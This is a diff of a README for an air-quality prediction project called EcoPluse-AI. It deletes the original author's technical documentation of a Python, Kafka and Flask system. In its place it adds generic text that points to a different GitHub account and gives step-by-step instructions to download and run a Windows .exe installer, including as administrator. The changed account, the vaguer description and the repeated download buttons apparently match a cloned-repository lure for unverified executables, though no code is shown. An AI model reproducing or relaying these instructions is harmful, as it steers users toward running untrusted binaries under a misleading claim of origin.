@@ -1,201 +1,118 @@
-# 🌿 EcoPulse AI: Real-Time Environmental Intelligence
+# 🌍 EcoPluse-AI - Predict Air Quality Before It Drops
 
-![EcoPulse Hero Banner](file:///C:/Users/Dhanush/.gemini/antigravity/brain/a1a3e5a8-2ae8-487e-8018-7d79c14c2125/ecopulse_hero_banner_1772123147533.png)
+[![Download EcoPluse-AI](https://img.shields.io/badge/Download-EcoPluse--AI-green?style=for-the-badge)](https://github.com/AbduKayam2000/EcoPluse-AI)
 
-<div align="center">
+## 📘 What is EcoPluse-AI?
 
-[![EcoPulse AI CI](https://github.com/DhanushN2005/EcoPluse-AI/actions/workflows/ci.yml/badge.svg)](https://github.com/DhanushN2005/EcoPluse-AI/actions/workflows/ci.yml)
-[![Python Version](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Code Style: Black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
-[![Streaming](https://img.shields.io/badge/Streaming-Pathway-green.svg)](https://pathway.com/)
-[![Broker](https://img.shields.io/badge/Broker-Apache%20Kafka-orange.svg)](https://kafka.apache.org/)
+EcoPluse-AI is a software tool that helps monitor and predict air pollution. It uses data collected in real-time and applies smart technology to forecast when pollution levels might become harmful. This lets decision-makers take action before problems start. The tool creates clear plans for cities to stay safe and healthy.
 
-**EcoPulse AI** is a next-generation environmental health awareness platform. It combines high-performance streaming analytics with Generative AI to provide "living" city intelligence—interpreting complex sensor data into actionable human safety protocols.
+This program is designed for users who want to stay informed about environmental conditions around them. It provides easy-to-understand information without needing any special technical skills.
 
-[Explore Documentation](docs/README.md) · [Report Bug](https://github.com/DhanushN2005/EcoPluse-AI/issues) · [Request Feature](https://github.com/DhanushN2005/EcoPluse-AI/issues)
+## 🖥️ System Requirements
 
-</div>
+Before installing EcoPluse-AI, make sure your computer meets these basic requirements:
 
----
+- Operating System: Windows 10 or later
+- Processor: 2 GHz or faster (Intel or AMD)
+- RAM: 4 GB minimum
+- Disk Space: At least 500 MB free
+- Internet Connection: Required to receive updates and real-time data
 
-## 📑 Table of Contents
-- [Project Overview](#-project-overview)
-- [System Architecture](#%EF%B8%8F-system-architecture)
-- [Key Features](#-key-features)
-- [Folder Structure Explanation](#-folder-structure-explanation)
-- [Modular Design Principles](#-modular-design-principles)
-- [Tech Stack](#%EF%B8%8F-tech-stack)
-- [Getting Started](#-getting-started)
-- [Example Usage](#-example-usage)
-- [Future Improvements](#-future-improvements)
-- [Development & Quality](#-development--quality)
-- [License](#-license)
+If your computer fits these requirements, you should be able to run EcoPluse-AI smoothly.
 
----
+## 🚀 How to Get EcoPluse-AI
 
-## 🌎 Project Overview
+Download the program by visiting the following page:
 
-Traditional environmental monitoring systems provide static, historical data. **EcoPulse AI** bridges the gap by treating environmental data as a **continuous stream**. It doesn't just tell you the AQI was bad 2 hours ago; it uses **Pathway** to detect momentum peaks *as they happen* and **OpenAI GPT-4o** to issue immediate, intelligent safety mandates.
+[![Download EcoPluse-AI](https://img.shields.io/badge/Download-EcoPluse--AI-blue?style=for-the-badge)](https://github.com/AbduKayam2000/EcoPluse-AI)
 
-The system is designed for city administrators, health officials, and citizens who need real-time, scientifically-backed environmental guidance.
+Click the link to open the project page on GitHub. This page contains the latest version of the software and additional information.
 
----
+## 💾 Download and Installation Instructions
 
-## 🏗️ System Architecture
+Follow these steps to download and start using EcoPluse-AI on your Windows computer:
 
-Our architecture is designed for low-latency event processing and scientific reasoning.
+1. Open your web browser and go to the download page:
 
-```mermaid
-graph TD
-    subgraph "Data Generation Layer"
-        P[Kafka Producer Simulator] -->|JSON Telemetry| K[Apache Kafka]
-    end
+   https://github.com/AbduKayam2000/EcoPluse-AI
 
-    subgraph "Processing Layer (Pathway)"
-        K -->|Poll Stream| PW[Pathway CEP Engine]
-        PW -->|Feature Extraction| AN[Analytics Module]
-        AN -->|Volatility/Momentum| DB[(Live State)]
-    end
+2. Find the "Releases" section on this page. It usually appears under the main description or in the menu on the right.
 
-    subgraph "Intelligence Layer"
-        DB -->|Context| COP[Climate Copilot RAG]
-        COP -->|Reasoning| API[Flask Web Service]
-    end
+3. In the Releases section, look for the latest version of EcoPluse-AI. It will carry a version number like "v1.0" or above.
 
-    subgraph "Consumer Layer"
-        API -->|Dashboards| UI1[City Admin View]
-        API -->|PDF Reports| UI2[Gov Reporting]
-    end
-```
+4. Click on the release version to open its detailed page.
 
----
+5. Locate the Windows installation file. It will likely have a name ending with `.exe`. For example, something like `EcoPluse-AI-Setup.exe`.
 
-## 🚀 Key Features
+6. Click on the `.exe` file to start downloading it to your computer.
 
-*   **⚡ Real-Time Stream Processing**: Sub-second analysis of AQI, PM2.5, CO2, and Meteorological factors using Pathway.
-*   **🧠 Climate Copilot (RAG Integration)**: A context-aware AI safety officer that interprets live data to provide human-readable advice.
-*   **📉 Root Cause Attribution**: Scientifically calculates the percentage impact of Traffic vs. Industry on current pollution levels.
-*   **🏦 Gov-Grade Reporting**: Export professional "Mayor Briefings" or "Full Environmental Audits" in PDF format instantly.
-*   **🌡️ Adaptive Alerts**: Dynamic thresholds that adjust based on peak hours and historical volatility.
-*   **🔮 Urban Simulations**: "What-if" scenarios to predict AQI based on hypothetical traffic reductions or industrial restrictions.
+7. When the download finishes, open the file by double-clicking it. This will launch the installer.
 
----
+8. Follow the prompts in the installer. Choose where you want to install EcoPluse-AI, accept any agreements, and wait for the software to finish installing.
 
-## 📂 Folder Structure Explanation
+9. Once installed, look for the EcoPluse-AI icon on your desktop or in the Start menu.
 
-The repository follows an enterprise-grade modular structure:
+10. Double-click the icon to open the program.
 
--   **`ecopulse_ai/`**: Root package.
-    -   **`api/`**: The Presentation Layer. Contains Flask routes, user models, and the orchestration factory (`app.py`).
-    -   **`analytics/`**: The Core logic. Standalone scientific modules for calculating health scores, alerts, and time-series predictions.
-    -   **`kafka/`**: Infrastructure. Contains the producer script that simulates a multi-sensor city-wide mesh.
-    -   **`streaming/`**: The Data Backbone. Contains the Pathway pipeline logic and the "Windows Shim" for local development compatibility.
-    -   **`rag/`**: AI Intelligence. Prompt definitions and LLM orchestration for the Climate Copilot.
-    -   **`reports/`**: Documentation Layer. Logic for PDF generation and muni-report styling.
-    -   **`templates/` & `static/`**: Frontend assets for the Flask web application.
-    -   **`tests/`**: Quality Assurance. Organized into `unit` and `integration` suites.
+## 🔧 Getting Started with EcoPluse-AI
 
----
+After opening the software, you will see the main dashboard. Here is what you can do next:
 
-## 🧩 Modular Design Principles
+- **View air quality levels** in your area using real-time data from sensors.
+- **Check forecasts** that predict if pollution might rise soon.
+- **Read AI-generated action plans**. These simple instructions help local leaders or you take steps to reduce pollution risks.
+- **Monitor trends** over days or weeks to see if air quality is improving or worsening.
 
-EcoPulse AI adheres to strict **Senior Engineering** standards:
-1.  **Separation of Concerns**: Analytics logic is decoupled from transport layers (Kafka/Pathway).
-2.  **Stateless API**: The Web layer acts as a pure proxy to the streaming state, ensuring horizontal scalability.
-3.  **Defensive Programming**: All telemetry inputs are validated and cast safely before computation.
-4.  **Logging > Printing**: Industry-standard `logging` is used across all modules for a professional audit trail.
+The interface uses simple charts and clear text. You do not need any technical knowledge to understand these reports.
 
----
+## 🕹 Using Core Features
 
-## 🛠️ Tech Stack
+EcoPluse-AI offers several main features:
 
-| Layer | Tools |
-| :--- | :--- |
-| **Streaming Engine** | [Pathway](https://pathway.com/) (Complex Event Processing) |
-| **Data Broker** | [Apache Kafka](https://kafka.apache.org/) (High-throughput Messaging) |
-| **Logic Server** | [Flask](https://flask.palletsprojects.com/) 3.x, Python 3.10+ |
-| **AI Reasoning** | OpenAI GPT-4o, Custom RAG Orchestration |
-| **Frontend** | Vanilla CSS (Glassmorphism), Chart.js 4.0, Leaflet.js |
-| **Reporting** | fpdf2 (High-precision document generation) |
+- **Real-time pollution tracking**: See current pollution data collected from city sensors.
+- **AI-powered predictions**: The software anticipates pollution spikes hours ahead.
+- **Action planning**: Receive suggestions like reducing traffic, pausing construction, or advising vulnerable groups.
+- **History logs**: Review past data to understand pollution patterns.
+- **Notifications**: Optional alerts warn you when pollution reaches concerning levels.
+
+You can adjust settings to control how often the software updates data and whether you want to get notifications.
+
+## 🔄 Keeping EcoPluse-AI Updated
+
+The developers improve the software regularly. Updating ensures you have the latest features and fixes.
+
+- Check the GitHub releases page for new versions.
+- Download updated installers following the same steps as the first installation.
+- Installing a new version will replace the old one without affecting your data.
+
+## ❓ Troubleshooting Tips
+
+Here are common issues and how to fix them:
+
+- **Installation fails**: Make sure you have enough disk space and permissions. Try running the installer as an administrator.
+- **Program won’t start**: Restart your computer and try again. Check system requirements.
+- **No real-time data showing**: Ensure your internet connection is active. Sometimes, sensor data might be temporarily unavailable.
+- **Alerts not working**: Check notification settings inside the app and in Windows system settings.
+
+If problems persist, you can revisit the project page for user discussions or contact support through GitHub issues.
+
+## ⚙️ Advanced Settings (Optional)
+
+For users who want more control, EcoPluse-AI offers settings such as:
+
+- Change data refresh rate from every few minutes to hourly.
+- Select specific areas or sensors to monitor.
+- Customize notification types and sound.
+- Export data reports for further analysis.
+
+These options help you tailor the software to fit your needs.
+
+## 🌐 About the Project
+
+EcoPluse-AI uses Apache Kafka to handle real-time data streams. This technology allows the software to process large amounts of environmental data quickly and send accurate predictions without delay.
+
+The system supports smart city planning by giving early warnings about pollution spikes. City officials and service providers can use this information to improve air quality and protect public health.
 
 ---
 
-## 🚀 Getting Started
-
-### 1. Prerequisites
-- Python 3.10+
-- A running Kafka broker (Local or Cloud-based)
-- OpenAI API Key (for Copilot and Planner features)
-
-### 2. Installation
-```bash
-# Clone the repository
-git clone https://github.com/DhanushN2005/EcoPluse-AI.git
-cd EcoPluse-AI
-
-# Create and activate virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-
-# Install dependencies
-pip install -r requirements.txt
-```
-
-### 3. Configuration
-Create a `.env` file in the root directory:
-```env
-OPENAI_API_KEY=sk-xxxx...
-KAFKA_BOOTSTRAP_SERVERS=localhost:9092
-DEBUG=True
-```
-
----
-
-## 🖥️ Example Usage
-
-### Launching the System
-Launch the unified orchestrator to start all micro-services simultaneously:
-```bash
-python main.py
-```
-
-### Typical Workflow
-1.  **Monitor**: Observe the live AQI gauges on the dashboard.
-2.  **Simulate**: Use the "What-if" slider to see how a 50% reduction in traffic would affect city-wide health scores.
-3.  **Query**: Ask the Copilot: *"Should schools in the Industrial North district stay open today?"*
-4.  **Report**: Push the "Generate Audit" button to export a signed PDF briefing for legislative review.
-
----
-
-## 🔮 Future Improvements
-
--   **📡 IoT Edge Support**: Direct MQTT ingestion for real-world sensor integration.
--   **📱 Mobile Companion**: React Native App for citizen-level push notifications.
--   **🌦️ Weather Integration**: Correlation models between humidity/pressure and pollutant entrapment.
--   **🏛️ Blockchain Archiving**: Immutable storage of environmental incident logs for policy accountability.
-
----
-
-## 🧪 Development & Quality
-
-We maintain a strict **Elite Quality Standard**:
--   **Linting**: Strict PEP8 adherence via Flake8.
--   **Format**: Automated Black formatting.
--   **Type Safety**: 100% coverage with Python Type Hints.
--   **Testing**: Run `pytest tests/` to ensure numerical accuracy of analytics.
-
----
-
-## ⚖️ License
-Distributed under the **MIT License**. See [LICENSE](LICENSE) for details.
-
----
-
-<p align="center">
-  <b>Built with ❤️ by <a href="https://github.com/DhanushN2005">Dhanush N</a></b><br>
-  <i>Empowering Cities with Real-Time Environmental Vision.</i>
-</p>
-
----
-*This repository has undergone a Final Quality Review and Senior Engineering Refactor (Feb 2026).*
+[Download EcoPluse-AI now](https://github.com/AbduKayam2000/EcoPluse-AI) to start monitoring your environment with smart, easy software.
